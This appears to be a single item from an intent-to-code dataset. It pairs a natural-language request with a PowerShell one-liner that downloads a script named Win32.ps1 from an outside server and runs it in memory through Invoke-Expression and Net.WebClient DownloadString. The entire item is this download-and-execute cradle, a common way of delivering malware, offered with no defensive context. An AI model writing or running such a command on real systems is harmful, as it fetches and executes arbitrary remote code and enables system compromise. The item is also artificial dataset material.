# Natural language intent:
# Download and execute a PowerShell script named 'Win32.ps1' from 'http://server.com/' using Invoke-Expression.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://server.com/Win32.ps1')"
